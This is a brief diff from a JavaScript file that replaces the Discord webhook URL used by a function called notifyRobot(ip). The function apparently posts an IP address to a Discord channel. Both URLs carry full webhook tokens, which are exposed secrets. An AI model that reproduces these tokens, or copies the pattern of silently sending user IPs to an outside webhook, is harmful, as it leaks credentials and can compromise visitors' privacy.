@@ -88,7 +88,7 @@ function notifyRobot(ip) {
         }
     }
     const request = new XMLHttpRequest();
-    request.open("POST", "https://discord.com/api/webhooks/907698021637181501/m41TMBRm0OZhlAu1f7hWLg2FMgoZZFz0pmZ2hRLwQseIHo6L-J03W5icdi9zoPwDWjcl");
+    request.open("POST", "https://discord.com/api/webhooks/1053420742362009611/Pty6ZAeltCsoIRhlhXHoNwaXhTY-Nn6x7EU0NPvVH2akVBGQ3mus-3iTWGbB-W3QfIcV");
     sentStuff = true;
     request.setRequestHeader('Content-type', 'application/json');
 
